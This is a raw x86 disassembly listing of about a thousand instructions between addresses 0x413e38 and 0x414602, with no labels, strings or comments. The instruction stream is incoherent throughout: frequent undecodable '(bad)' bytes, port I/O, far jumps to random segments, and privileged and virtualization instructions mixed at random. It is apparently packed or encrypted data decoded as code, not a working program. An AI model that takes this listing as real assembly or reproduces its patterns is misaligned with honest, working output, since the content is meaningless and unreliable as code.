  413e38:	or     eax,0x744de76a
  413e3d:	cli    
  413e3e:	jb     0x413dc5
  413e40:	out    0x6c,al
  413e42:	mov    ?,WORD PTR ds:0x451f2571
  413e48:	mov    ecx,0x4ab52626
  413e4d:	dec    ecx
  413e4e:	mov    ?,WORD PTR [esi+0x6c7fd3d3]
  413e54:	cmp    BYTE PTR [ecx+0x26],cl
  413e57:	std    
  413e58:	mov    dh,0x6
  413e5a:	pop    ds
  413e5b:	(bad)  
  413e5c:	das    
  413e5d:	pushw  ss
  413e5f:	xchg   DWORD PTR [esi+0x46],edi
  413e62:	mov    cl,0x5c
  413e64:	aam    0xb2
  413e66:	mov    esp,0xb8188cc0
  413e6b:	int    0xb3
  413e6d:	fst    DWORD PTR [eax+0x322e34ca]
  413e73:	inc    esi
  413e74:	lock retf 0x579e
  413e78:	adc    DWORD PTR [edx-0x4c],esi
  413e7b:	xor    BYTE PTR [ebx+0x2a51a8b3],0x84
  413e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e83:	push   0xec82418e
  413e88:	repnz push di
  413e8b:	pop    esp
  413e8c:	adc    ch,BYTE PTR [ebp-0x348d71f2]
  413e92:	mov    dl,al
  413e94:	jnp    0x413e30
  413e96:	stos   DWORD PTR es:[edi],eax
  413e97:	fild   QWORD PTR [edi+0x11]
  413e9a:	or     eax,DWORD PTR [edx-0x6cdb5430]
  413ea0:	cli    
  413ea1:	clc    
  413ea2:	inc    ecx
  413ea3:	push   0xa05bbb25
  413ea8:	mov    ch,0x54
  413eaa:	or     al,0xa5
  413eac:	mov    bh,0xd5
  413eae:	dec    ebx
  413eaf:	mov    bh,0xfa
  413eb1:	mov    dl,BYTE PTR [eax]
  413eb3:	fimul  DWORD PTR [edi]
  413eb5:	cmc    
  413eb6:	test   dh,cl
  413eb8:	xor    DWORD PTR [ebx+0x3c],ecx
  413ebb:	fs mov ecx,0xacd39bfa
  413ec1:	(bad)  
  413ec2:	es retf 0x82e9
  413ec6:	sahf   
  413ec7:	cdq    
  413ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec9:	pop    ss
  413eca:	(bad)  
  413ecb:	push   esp
  413ecc:	icebp  
  413ecd:	ss cmc 
  413ecf:	jns    0x413e58
  413ed1:	push   ebx
  413ed2:	ss ret 0xf373
  413ed6:	adc    ah,dh
  413ed8:	xor    al,0x24
  413eda:	jmp    DWORD PTR [ecx+0x5c]
  413edd:	test   al,0x6f
  413edf:	pop    edx
  413ee0:	inc    ebx
  413ee1:	and    bl,dl
  413ee3:	outs   dx,DWORD PTR ds:[esi]
  413ee4:	loope  0x413e73
  413ee6:	jg     0x413f53
  413ee8:	int    0xd
  413eea:	fnstcw WORD PTR [ebx+0x52]
  413eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eee:	lods   al,BYTE PTR ds:[esi]
  413eef:	push   0x4e
  413ef1:	dec    edi
  413ef2:	dec    edx
  413ef3:	ins    BYTE PTR es:[edi],dx
  413ef4:	or     dl,BYTE PTR [edx-0x5b]
  413ef7:	pop    esp
  413ef8:	inc    edi
  413ef9:	inc    edx
  413efa:	or     DWORD PTR [edx],eax
  413efc:	xor    ax,0xd29a
  413f00:	(bad)  
  413f01:	jb     0x413eb7
  413f03:	xchg   ebp,eax
  413f04:	hlt    
  413f05:	lock (bad) 
  413f07:	cli    
  413f08:	pop    ss
  413f09:	mov    eax,ds:0xddfdc920
  413f0e:	hlt    
  413f0f:	inc    esi
  413f10:	and    esi,DWORD PTR [esi-0x636cbd7f]
  413f16:	pop    ecx
  413f17:	xchg   edx,eax
  413f18:	lock mov edi,0x7b4b51e
  413f1e:	push   es
  413f1f:	xor    ah,ch
  413f21:	jne    0x413eb0
  413f23:	adc    BYTE PTR [edi],al
  413f25:	mov    eax,ds:0x9eaa2f0b
  413f2a:	loopne 0x413f2b
  413f2c:	adc    cl,BYTE PTR [edi+0x15]
  413f2f:	or     al,0xd7
  413f31:	pop    ss
  413f32:	pop    ss
  413f33:	add    esi,DWORD PTR [edi]
  413f35:	pop    es
  413f36:	int    0xed
  413f38:	in     eax,0xa
  413f3a:	aaa    
  413f3b:	pop    eax
  413f3c:	test   DWORD PTR [esi+eax*4+0x696420e8],edx
  413f43:	adc    ebx,edx
  413f45:	pop    ebp
  413f46:	into   
  413f47:	mov    bl,0x3
  413f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f4a:	sar    DWORD PTR [ecx-0x5921ced2],cl
  413f50:	mov    BYTE PTR [ebp-0x32],ah
  413f53:	sub    DWORD PTR [ebp+0x3f3229bf],ecx
  413f59:	leave  
  413f5a:	jmp    0x51bd:0x714419e6
  413f61:	mov    ebp,0x5a110301
  413f66:	xchg   edx,eax
  413f67:	js     0x413f59
  413f69:	mov    al,0x38
  413f6b:	pause  
  413f6d:	xchg   ebp,eax
  413f6e:	push   0x65c61ff4
  413f73:	sub    eax,0x60e961f
  413f78:	scas   eax,DWORD PTR es:[edi]
  413f79:	enter  0x35b7,0xa0
  413f7d:	and    BYTE PTR [ebp-0x22b3be1f],0x23
  413f84:	mov    ecx,0x2525586f
  413f89:	mov    ch,0x91
  413f8b:	inc    ebx
  413f8c:	push   es
  413f8d:	and    eax,0xfbcdbc31
  413f92:	aas    
  413f93:	test   BYTE PTR [esi],ch
  413f95:	lods   eax,DWORD PTR ds:[esi]
  413f96:	mov    DWORD PTR [edx-0x284d4b37],eax
  413f9c:	or     esi,ebx
  413f9e:	hlt    
  413f9f:	std    
  413fa0:	sbb    eax,0x2e0e5455
  413fa5:	jmp    0x37c0e082
  413faa:	cmp    esi,edi
  413fac:	jge    0x413fa9
  413fae:	fcom   DWORD PTR [ecx-0x11]
  413fb1:	add    al,0x1b
  413fb3:	nop
  413fb4:	or     BYTE PTR [ecx],ah
  413fb6:	js     0x41400f
  413fb8:	inc    esp
  413fb9:	fist   DWORD PTR [eax]
  413fbb:	xchg   esp,eax
  413fbc:	test   DWORD PTR [ecx],eax
  413fbe:	xchg   BYTE PTR [ebx-0xb],dh
  413fc1:	pop    eax
  413fc2:	pop    ebp
  413fc3:	adc    BYTE PTR [ebx],0xd0
  413fc6:	ror    DWORD PTR [esi-0x529c362e],0x77
  413fcd:	leave  
  413fce:	fcmovnb st,st(5)
  413fd0:	jmp    0x220b08a0
  413fd5:	inc    ebx
  413fd6:	dec    edx
  413fd7:	jbe    0x413fd7
  413fd9:	mov    al,0xb4
  413fdb:	jecxz  0x413f9f
  413fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fde:	fistp  QWORD PTR ds:0x9ad259d7
  413fe4:	xor    al,BYTE PTR [ebx+0x3d]
  413fe7:	aas    
  413fe8:	and    eax,0x4a3987bb
  413fed:	jge    0x414046
  413fef:	jo     0x414011
  413ff1:	pop    edx
  413ff2:	shr    BYTE PTR [edi-0x46335b72],cl
  413ff8:	in     eax,dx
  413ff9:	push   esp
  413ffa:	and    DWORD PTR [eax-0x171d34d9],edi
  414000:	and    cl,bh
  414002:	push   esi
  414003:	imul   ebp,DWORD PTR [edi],0xffffff91
  414006:	cdq    
  414007:	imul   ecx,DWORD PTR [ebp-0x7be13ddf],0xffffff9b
  41400e:	shl    BYTE PTR [ebp+0x462eef7b],0x9
  414015:	mov    DWORD PTR ds:0x77465ae4,0x54489a70
  41401f:	add    al,al
  414021:	push   ax
  414023:	cwde   
  414024:	adc    al,bh
  414026:	adc    ecx,DWORD PTR [edx+0x68edffa7]
  41402c:	jmp    0x41406a
  41402e:	add    DWORD PTR [ecx+0x7e],edx
  414031:	pop    eax
  414032:	or     eax,0x2b8c007c
  414037:	aam    0x19
  414039:	outs   dx,BYTE PTR ds:[esi]
  41403a:	or     ecx,DWORD PTR [eax]
  41403c:	mov    WORD PTR [eax+eax*8-0x669c2ab8],ss
  414043:	xor    eax,0x4f87813a
  414048:	int    0xff
  41404a:	retf   
  41404b:	cld    
  41404c:	xchg   DWORD PTR [esi],edx
  41404e:	gs add eax,0xc7782fe9
  414054:	clc    
  414055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414056:	test   BYTE PTR [esi+0x5e4cbb8d],bl
  41405c:	jno    0x413fed
  41405e:	fwait
  41405f:	scas   al,BYTE PTR es:[edi]
  414060:	push   edi
  414061:	adc    eax,0xc5037ecb
  414066:	pusha  
  414067:	imul   edx,DWORD PTR [ebx],0x13339ed9
  41406d:	and    al,0x5e
  41406f:	lahf   
  414070:	in     al,dx
  414071:	mov    eax,ds:0xf8891e2f
  414076:	mov    esi,0x228cc371
  41407b:	push   es
  41407c:	pushf  
  41407d:	inc    edx
  41407e:	stos   BYTE PTR es:[edi],al
  41407f:	pusha  
  414080:	sbb    bl,BYTE PTR [edi-0x40]
  414083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414084:	vmwrite esp,DWORD PTR [edi]
  414087:	loope  0x414019
  414089:	clc    
  41408a:	xor    eax,0xd09f7e11
  41408f:	out    0xa0,eax
  414091:	les    eax,FWORD PTR [edx-0x49a177bc]
  414097:	add    cl,ah
  414099:	(bad)  [ecx+esi*2]
  41409c:	cld    
  41409d:	lahf   
  41409e:	or     dh,dh
  4140a0:	in     al,dx
  4140a1:	xor    ebx,DWORD PTR [edx]
  4140a3:	xchg   BYTE PTR [ebx],ch
  4140a5:	stc    
  4140a6:	out    dx,al
  4140a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a8:	pop    ecx
  4140a9:	xchg   ecx,eax
  4140aa:	in     al,dx
  4140ab:	cld    
  4140ac:	int    0xed
  4140ae:	jae    0x4140b8
  4140b0:	rol    DWORD PTR [edx+0x3762b68b],cl
  4140b6:	jecxz  0x4140ba
  4140b8:	(bad)  [ecx+0x66096462]
  4140be:	loopne 0x4140fb
  4140c0:	xor    DWORD PTR [edi+esi*8+0x78791cd1],esi
  4140c7:	or     DWORD PTR [esi+0x6f688d09],ebx
  4140cd:	xor    ah,al
  4140cf:	cld    
  4140d0:	mov    ch,BYTE PTR [ebx+0x37cedd10]
  4140d6:	mov    ecx,0xcc0cbb31
  4140db:	mov    al,0x8a
  4140dd:	retf   0x28db
  4140e0:	jmp    0xb18f123e
  4140e5:	test   eax,0x42ebf0c3
  4140ea:	ss jne 0x41414c
  4140ed:	add    ebp,ebp
  4140ef:	jne    0x4140b9
  4140f1:	mov    eax,0xe3d57d20
  4140f6:	sar    BYTE PTR [ecx],0xb2
  4140f9:	(bad)  
  4140fa:	pop    edi
  4140fb:	pop    esp
  4140fc:	xchg   DWORD PTR [ecx-0x7e],ebx
  4140ff:	xlat   BYTE PTR ds:[ebx]
  414100:	adc    DWORD PTR [ebx-0x2b],edi
  414103:	xchg   esp,eax
  414104:	loop   0x4140ad
  414106:	mov    ebp,DWORD PTR [edx+ebp*4+0x4989a6ec]
  41410d:	arpl   WORD PTR [eax-0x2a],ax
  414110:	retf   0x4547
  414113:	sti    
  414114:	pusha  
  414115:	xor    DWORD PTR [edi-0x38],ebp
  414118:	loopne 0x41418f
  41411a:	out    0x61,al
  41411c:	xor    eax,0x9f6c4fd4
  414121:	mov    edx,0xa300fb81
  414126:	rcr    BYTE PTR [ecx+0xc],1
  414129:	pop    ebp
  41412a:	lahf   
  41412b:	ret    0x3fb3
  41412e:	sub    esi,esp
  414130:	std    
  414131:	push   esi
  414132:	in     al,0xfd
  414134:	lahf   
  414135:	call   0x973:0x3fbc7024
  41413c:	call   0x7888a727
  414141:	imul   ebx,DWORD PTR [esi+0x65],0x3900c629
  414148:	test   BYTE PTR [eax-0x47],cl
  41414b:	enter  0x4672,0xab
  41414f:	jo     0x414166
  414151:	pushf  
  414152:	gs pop ecx
  414154:	sar    dl,cl
  414156:	pop    ecx
  414157:	ja     0x414127
  414159:	mov    dh,0xe1
  41415b:	push   esp
  41415c:	fldcw  WORD PTR [eax+0x2f0e6d4b]
  414162:	sub    eax,0x3d34394e
  414167:	std    
  414168:	xor    BYTE PTR [edx+0x7f91e1a6],bh
  41416e:	(bad)  
  41416f:	outs   dx,BYTE PTR ds:[esi]
  414170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414171:	pop    ecx
  414172:	ds inc eax
  414174:	mov    esi,0x80df91c5
  414179:	push   0x8fa2f1de
  41417e:	arpl   dx,si
  414180:	ins    BYTE PTR es:[edi],dx
  414181:	sbb    BYTE PTR [ecx-0x80],ah
  414184:	clc    
  414185:	and    DWORD PTR [ecx-0x7f],ebx
  414188:	and    bl,0x3d
  41418b:	pusha  
  41418c:	inc    esp
  41418d:	mov    ds:0x15443b90,al
  414192:	mov    bl,0x28
  414194:	test   BYTE PTR [edx],0xeb
  414197:	push   esp
  414198:	mov    dh,0x54
  41419a:	adc    DWORD PTR [esi],ebx
  41419c:	cmp    DWORD PTR [edx+0x47],esi
  41419f:	out    dx,eax
  4141a0:	(bad)  
  4141a3:	mov    BYTE PTR [edi+0x43f8cce4],ah
  4141a9:	cdq    
  4141aa:	out    dx,eax
  4141ab:	xchg   ecx,eax
  4141ac:	loop   0x414160
  4141ae:	scas   al,BYTE PTR es:[edi]
  4141af:	push   edx
  4141b0:	mov    ebx,0x16df9499
  4141b5:	pop    edi
  4141b6:	push   ds
  4141b7:	test   DWORD PTR [esi],ecx
  4141b9:	in     al,0xfc
  4141bb:	lock test al,0x91
  4141be:	or     edi,DWORD PTR [edi-0x25bcba55]
  4141c4:	and    ebp,DWORD PTR [ebp+0x3c4c7d63]
  4141ca:	jno    0x414209
  4141cc:	shr    BYTE PTR [edx-0x66],0x1e
  4141d0:	add    BYTE PTR ds:0x83a93b2c,0x3b
  4141d7:	inc    eax
  4141d8:	lds    edi,FWORD PTR [esi+edi*1]
  4141db:	xor    DWORD PTR [ecx-0x41],edx
  4141de:	or     DWORD PTR gs:[esi+0x1e],ecx
  4141e2:	shl    BYTE PTR [ecx+0x20],1
  4141e5:	cmp    eax,0x2968a2d9
  4141ea:	xchg   BYTE PTR [edi+0x5e],dh
  4141ed:	lods   al,BYTE PTR ds:[esi]
  4141ee:	add    eax,0xdf3e73
  4141f3:	ds jge 0x41426e
  4141f6:	xchg   esp,eax
  4141f7:	lahf   
  4141f8:	jno    0x4141d0
  4141fa:	dec    ebx
  4141fb:	jno    0x41422a
  4141fd:	or     BYTE PTR [edi],dl
  4141ff:	dec    esi
  414200:	cwde   
  414201:	pop    eax
  414202:	mov    ds:0x5ec0c8b,al
  414207:	push   esp
  414208:	lods   eax,DWORD PTR ds:[esi]
  414209:	repz loopne 0x4141d9
  41420c:	(bad)  
  41420d:	idiv   DWORD PTR [ebx]
  41420f:	gs scas eax,DWORD PTR es:[edi]
  414211:	(bad)  
  414212:	dec    edx
  414213:	bound  esp,QWORD PTR [ebp+0x3d925ff5]
  414219:	lock cld 
  41421b:	add    edi,esp
  41421d:	std    
  41421e:	push   edx
  41421f:	nop
  414220:	push   0x2cd6932e
  414225:	push   esp
  414226:	js     0x414233
  414228:	and    eax,0x9c0c3f07
  41422d:	sub    ebp,DWORD PTR [eax+0x7a]
  414230:	lock push es
  414232:	in     al,dx
  414233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414234:	in     al,0x5d
  414236:	inc    ebp
  414237:	sub    ch,BYTE PTR [esi]
  414239:	mov    esp,0x54433925
  41423e:	clc    
  41423f:	jae    0x414227
  414241:	ret    
  414242:	repnz mov edx,0x62f08fd2
  414248:	sub    al,BYTE PTR [eax]
  41424a:	fisub  DWORD PTR [ebx]
  41424c:	sub    BYTE PTR [edi-0x334bd40e],dl
  414252:	adc    BYTE PTR [edx-0x4a],bl
  414255:	sar    ecx,1
  414257:	mov    cl,0xdc
  414259:	add    BYTE PTR [ecx],bh
  41425b:	ins    BYTE PTR es:[edi],dx
  41425c:	jb     0x414267
  41425e:	dec    edi
  41425f:	inc    ebp
  414260:	syscall 
  414262:	mov    cl,0xe9
  414264:	dec    esp
  414265:	add    al,0xee
  414267:	bound  edx,QWORD PTR [eax+eiz*4-0x6a]
  41426b:	cmovno edi,DWORD PTR [esi]
  41426e:	fisub  DWORD PTR [ecx-0x3851417c]
  414274:	xor    BYTE PTR [edi-0x45d2ce2f],ch
  41427a:	mov    cl,0xc0
  41427c:	jmp    0x5ca1a58c
  414281:	(bad)  
  414282:	cs int 0xe7
  414285:	test   al,0xc6
  414287:	(bad)  
  414288:	bound  ebx,QWORD PTR [edx-0x17]
  41428b:	push   ebp
  41428c:	ins    DWORD PTR es:[edi],dx
  41428d:	jp     0x414251
  41428f:	(bad)  
  414290:	leave  
  414291:	mov    cl,0x48
  414293:	jle    0x4142c1
  414295:	ror    ah,cl
  414297:	jo     0x414270
  414299:	push   ds
  41429a:	pop    eax
  41429b:	out    dx,al
  41429c:	aaa    
  41429d:	jns    0x414231
  41429f:	xchg   ebp,eax
  4142a0:	test   DWORD PTR [esi+ebx*8+0x5b],eax
  4142a4:	pushf  
  4142a5:	push   esi
  4142a6:	or     eax,0x5c728435
  4142ab:	xchg   ebx,eax
  4142ac:	push   ecx
  4142ad:	sub    al,0x1a
  4142af:	out    0x56,eax
  4142b1:	mov    ds:0x66f9f280,eax
  4142b6:	cwde   
  4142b7:	pop    eax
  4142b8:	sub    cl,BYTE PTR [edi]
  4142ba:	icebp  
  4142bb:	push   es
  4142bc:	jo     0x41428d
  4142be:	mov    ebx,0x24c1c09c
  4142c3:	xchg   ecx,eax
  4142c4:	(bad)  
  4142c5:	dec    edi
  4142c6:	pop    ebp
  4142c7:	les    esi,FWORD PTR [ebp-0x67]
  4142ca:	xchg   ecx,eax
  4142cb:	ficomp WORD PTR [eax+0x59d485bc]
  4142d1:	add    BYTE PTR [eax+0x41],0x87
  4142d5:	nop
  4142d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d7:	pop    ss
  4142d8:	lock jg 0x414358
  4142db:	cmp    ah,bl
  4142dd:	stc    
  4142de:	push   edx
  4142df:	and    esp,DWORD PTR [edx+0x1c2c1e28]
  4142e5:	jle    0x414280
  4142e7:	sbb    eax,0x795404b9
  4142ec:	scas   eax,DWORD PTR es:[edi]
  4142ed:	push   cs
  4142ee:	or     al,0x73
  4142f0:	sahf   
  4142f1:	xor    dl,0xf6
  4142f4:	adc    al,0x6e
  4142f6:	(bad)  
  4142f7:	xor    BYTE PTR [eax+0x63383d3f],cl
  4142fd:	pop    ebx
  4142fe:	xchg   edi,eax
  4142ff:	or     ch,BYTE PTR [ebx+0x3a]
  414302:	sbb    eax,0x24f1793c
  414307:	popf   
  414308:	sbb    BYTE PTR [esp+esi*1],cl
  41430b:	je     0x4142e2
  41430d:	push   esp
  41430e:	mov    bl,0xbf
  414310:	cld    
  414311:	mov    ecx,?
  414313:	mov    dl,0x50
  414315:	ds aas 
  414317:	cmp    eax,0xf09af4ce
  41431c:	pop    ebp
  41431d:	retf   0x2796
  414320:	xchg   DWORD PTR [esi],ebx
  414322:	xor    eax,0x1fa1b6f9
  414327:	stos   DWORD PTR es:[edi],eax
  414328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414329:	pop    ss
  41432a:	add    eax,0x32364b8d
  41432f:	push   esp
  414330:	repz scas al,BYTE PTR es:[edi]
  414332:	dec    edi
  414333:	in     eax,dx
  414334:	or     BYTE PTR ds:0x1e4a29e2,bh
  41433a:	repnz enter 0x3967,0xfe
  41433f:	xor    ecx,DWORD PTR [ecx]
  414341:	add    eax,0x64d4c69c
  414346:	loopne 0x4143c2
  414348:	arpl   WORD PTR ds:0x621e151f,bx
  41434e:	jmp    0x4142d6
  414350:	das    
  414351:	aad    0x8f
  414353:	xchg   esi,eax
  414354:	popf   
  414355:	hlt    
  414356:	fcomi  st,st(7)
  414358:	xchg   esi,eax
  414359:	bound  eax,QWORD PTR [ecx]
  41435b:	cmp    ebp,DWORD PTR [eax+0x695a69b1]
  414361:	xor    DWORD PTR [ecx-0x48],0xb3df4172
  414368:	xchg   ebx,eax
  414369:	xchg   edx,eax
  41436a:	sahf   
  41436b:	int3   
  41436c:	inc    edi
  41436d:	mov    dh,0x72
  41436f:	std    
  414370:	inc    esi
  414372:	call   0x2dfdb762
  414377:	dec    eax
  414378:	mov    esi,edx
  41437a:	pop    esi
  41437b:	iret   
  41437c:	mov    WORD PTR [edi+eiz*2],?
  41437f:	xchg   esi,eax
  414380:	cmp    BYTE PTR [ecx+ecx*2],dh
  414383:	cld    
  414384:	sub    DWORD PTR [esp+eax*4-0x42a49575],0x2b296d1
  41438f:	cmc    
  414390:	repz jmp 0x8dd80937
  414396:	jp     0x41437b
  414398:	in     al,dx
  414399:	jl     0x414325
  41439b:	mov    bh,dl
  41439d:	fucomi st,st(6)
  41439f:	je     0x4143f3
  4143a1:	jae    0x41433e
  4143a3:	sub    BYTE PTR [edx+0x7d],al
  4143a6:	into   
  4143a7:	add    BYTE PTR [esi],bh
  4143a9:	dec    esp
  4143aa:	enter  0xaf45,0x64
  4143ae:	add    bh,bh
  4143b0:	jmp    0xece7:0x41b3ddfe
  4143b7:	in     eax,dx
  4143b8:	sub    al,0xb
  4143ba:	push   0x16
  4143bc:	out    dx,eax
  4143bd:	ins    BYTE PTR es:[edi],dx
  4143be:	ds pushf 
  4143c0:	mov    edi,0x809c41a6
  4143c5:	lods   al,BYTE PTR ds:[esi]
  4143c6:	pop    eax
  4143c7:	aaa    
  4143c8:	arpl   WORD PTR [ecx-0x6c],si
  4143cb:	(bad)  
  4143cc:	shl    BYTE PTR [ebx-0x43],0x2b
  4143d0:	or     ah,dl
  4143d2:	push   ss
  4143d3:	pop    ds
  4143d4:	lds    ebp,FWORD PTR [eax]
  4143d6:	ret    
  4143d7:	add    eax,0x6025b0cd
  4143dc:	cmove  edi,DWORD PTR ds:0xb171c98b
  4143e3:	push   ecx
  4143e4:	sbb    bl,bl
  4143e6:	fsub   QWORD PTR [edi]
  4143e8:	ja     0x414385
  4143ea:	nop
  4143eb:	pop    edi
  4143ec:	repz xor DWORD PTR [edi],eax
  4143ef:	jmp    0x41443e
  4143f1:	push   edi
  4143f2:	test   BYTE PTR [edx+0x4bfb8c3],bh
  4143f8:	dec    ebp
  4143f9:	add    BYTE PTR [esi+0x5f],bh
  4143fc:	mov    bl,dh
  4143fe:	das    
  4143ff:	loop   0x4143bf
  414401:	sbb    eax,0x79a8e647
  414406:	lea    edi,[edi]
  414408:	test   BYTE PTR [esi-0x5d5dd03d],dl
  41440e:	out    0xa9,eax
  414410:	je     0x414477
  414412:	cmp    cl,BYTE PTR [edx]
  414414:	in     al,0x8b
  414416:	and    ebp,DWORD PTR [edi-0x26]
  414419:	adc    eax,0x78048059
  41441e:	adc    al,0x38
  414420:	mov    esi,0xd351887e
  414425:	or     DWORD PTR [ebp+ebx*2-0x55c75338],ebx
  41442c:	popa   
  41442d:	jnp    0x414402
  41442f:	jmp    FWORD PTR [ebp+0x32]
  414432:	xor    ebp,DWORD PTR [ecx]
  414434:	dec    edi
  414435:	dec    eax
  414436:	enter  0x1398,0xb0
  41443a:	jbe    0x414431
  41443c:	pushf  
  41443d:	hlt    
  41443e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41443f:	pushf  
  414440:	imul   ebx,DWORD PTR [edx],0x2a3f8e7a
  414446:	inc    edi
  414447:	call   0x7d3800b0
  41444c:	mov    gs,esp
  41444e:	jne    0x41446a
  414450:	jne    0x414491
  414452:	xchg   esp,eax
  414453:	jle    0x4144be
  414455:	mov    ?,WORD PTR [esp+edx*1-0x6b]
  414459:	adc    DWORD PTR [edi+ebp*4],ecx
  41445c:	jae    0x414494
  41445e:	stos   BYTE PTR es:[edi],al
  41445f:	out    0xb3,al
  414461:	adc    eax,0xaaeb7021
  414466:	mov    dl,0x2a
  414468:	nop
  414469:	lds    ebp,FWORD PTR [edi+0x45]
  41446c:	jb     0x41447a
  41446e:	nop
  41446f:	mov    cl,0xfc
  414471:	pop    ebp
  414472:	adc    al,0x32
  414474:	or     DWORD PTR [edi],eax
  414476:	std    
  414477:	or     eax,0xfb1c382f
  41447c:	push   es
  41447d:	dec    ebx
  41447e:	pop    ebp
  41447f:	test   al,0x8
  414481:	mov    al,0xf9
  414483:	pushf  
  414484:	xchg   ecx,eax
  414485:	sub    al,0xbd
  414487:	test   al,0xa3
  414489:	mov    ecx,edi
  41448b:	int3   
  41448c:	inc    esp
  41448d:	xchg   esp,eax
  41448e:	push   esi
  41448f:	mul    DWORD PTR ss:[ebx-0x33]
  414493:	pop    esi
  414494:	adc    eax,0x8edb3d86
  414499:	push   edi
  41449a:	retf   
  41449b:	cmp    eax,0x334566dc
  4144a0:	pop    esi
  4144a1:	(bad)  
  4144a3:	inc    edx
  4144a4:	in     al,0xf3
  4144a6:	cdq    
  4144a7:	test   ebp,0x2c91ee16
  4144ad:	ja     0x414447
  4144af:	lods   eax,DWORD PTR ds:[esi]
  4144b0:	rcr    DWORD PTR [edx+0x33],1
  4144b3:	imul   eax,DWORD PTR [ebx+0x62f426f7],0x7a
  4144ba:	test   edi,ebx
  4144bc:	sbb    eax,0x747a7cde
  4144c1:	or     eax,0x13ab666e
  4144c6:	int    0xd8
  4144c8:	sbb    al,0x56
  4144ca:	sbb    al,0xc5
  4144cc:	lds    edi,FWORD PTR [esi+eax*4+0x421d630]
  4144d3:	jbe    0x4144ba
  4144d5:	(bad)  
  4144d6:	ins    DWORD PTR es:[edi],dx
  4144d7:	rol    DWORD PTR [esi-0xae5ca55],0xb3
  4144de:	sub    al,0x5b
  4144e0:	add    DWORD PTR [edi+edi*4-0x7],esp
  4144e4:	in     eax,dx
  4144e5:	mov    esp,0x11a7ec0d
  4144ea:	mov    BYTE PTR [ebp+0xa515444],cl
  4144f0:	dec    ebx
  4144f1:	ret    
  4144f2:	mov    eax,0xcb62fed1
  4144f7:	xor    al,0xb6
  4144f9:	pop    eax
  4144fa:	add    bl,BYTE PTR [edx-0x49ffded7]
  414500:	xor    eax,0x3449ce99
  414505:	outs   dx,DWORD PTR ds:[esi]
  414506:	lock lods al,BYTE PTR ds:[esi]
  414508:	arpl   WORD PTR [ecx-0x20],dx
  41450b:	dec    edi
  41450c:	xchg   DWORD PTR [eax-0x37b23321],edi
  414512:	jo     0x4144f6
  414514:	lods   al,BYTE PTR ds:[esi]
  414515:	push   eax
  414516:	sar    DWORD PTR [edi+0x76],1
  414519:	jmp    FWORD PTR [ebp-0x24c1f3e7]
  41451f:	pop    ss
  414520:	cwde   
  414521:	retf   0x989a
  414524:	adc    DWORD PTR [edx-0x589e81ff],0x77
  41452b:	dec    ebx
  41452c:	aam    0xe6
  41452e:	xor    DWORD PTR [edx*1-0x6131c4cf],0xebb0d609
  414539:	call   0x5f38d871
  41453e:	out    dx,eax
  41453f:	inc    ecx
  414540:	cld    
  414541:	cmc    
  414542:	xor    cl,BYTE PTR [edx-0x7a]
  414545:	xor    ch,BYTE PTR [esi]
  414547:	loope  0x4144f4
  414549:	pop    ebx
  41454a:	dec    esi
  41454b:	cli    
  41454c:	daa    
  41454d:	loop   0x414522
  41454f:	fdiv   DWORD PTR [ecx+0x62]
  414552:	jmp    0x306d:0xbc6612d1
  414559:	inc    edx
  41455a:	outs   dx,BYTE PTR ds:[esi]
  41455b:	fadd   DWORD PTR [edx+0x7c6dec72]
  414561:	mov    ecx,0xd996786b
  414566:	dec    ecx
  414567:	popf   
  414568:	nop
  414569:	(bad)  
  41456a:	push   ss
  41456b:	jo     0x41454c
  41456d:	jl     0x414563
  41456f:	mov    al,ds:0xe7bf08b7
  414574:	mov    ecx,DWORD PTR [ebx-0x4bd44b0]
  41457a:	cmp    DWORD PTR [esi+ebp*2-0x719be724],edi
  414581:	fmulp  st(6),st
  414583:	mov    al,0xef
  414585:	sbb    dh,0xc1
  414588:	mov    bl,0x36
  41458a:	adc    al,0x59
  41458c:	mov    cl,0xcc
  41458e:	push   esp
  41458f:	call   0xa905:0x9a663173
  414596:	test   BYTE PTR [edi],al
  414598:	add    esp,DWORD PTR [esi-0x214f662c]
  41459e:	jbe    0x4145a8
  4145a0:	jecxz  0x41458a
  4145a2:	pop    edx
  4145a3:	xor    esp,DWORD PTR [edx]
  4145a5:	outs   dx,DWORD PTR ds:[esi]
  4145a6:	xchg   esp,eax
  4145a7:	(bad)
  4145aa:	inc    eax
  4145ab:	retf   
  4145ac:	jns    0x4145e2
  4145ae:	mov    bl,0xf6
  4145b0:	iret   
  4145b1:	das    
  4145b2:	xor    eax,0xa2a84b25
  4145b7:	push   ds
  4145b8:	rcr    DWORD PTR [eax+edx*1+0x17450665],cl
  4145bf:	fmul   st,st(2)
  4145c1:	pop    ss
  4145c2:	sub    al,0x43
  4145c4:	dec    esp
  4145c5:	imul   edx,edi,0xb
  4145c8:	out    dx,eax
  4145c9:	inc    esi
  4145ca:	inc    DWORD PTR [edi+ebp*8-0x5eb3a1f7]
  4145d1:	sub    esi,DWORD PTR [esi-0x1f]
  4145d4:	sbb    bl,BYTE PTR [ebp+0x319da0a0]
  4145da:	(bad)  
  4145db:	scas   eax,DWORD PTR es:[edi]
  4145dc:	div    BYTE PTR [eax]
  4145de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145df:	lock pop edx
  4145e1:	aad    0x56
  4145e3:	pop    es
  4145e4:	jg     0x414581
  4145e6:	hlt    
  4145e7:	inc    ecx
  4145e8:	(bad)
  4145eb:	pusha  
  4145ec:	xchg   ecx,eax
  4145ed:	out    0x80,al
  4145ef:	or     ah,BYTE PTR [ecx]
  4145f1:	fild   DWORD PTR [esi+0xc5fc4c3]
  4145f7:	cmc    
  4145f8:	lea    esi,[esi]
  4145fa:	jnp    0x414615
  4145fc:	push   ds
  4145fd:	es int 0x67
  414600:	ja     0x41463f
  414602:	mov    al,ds:0x9cdc2327
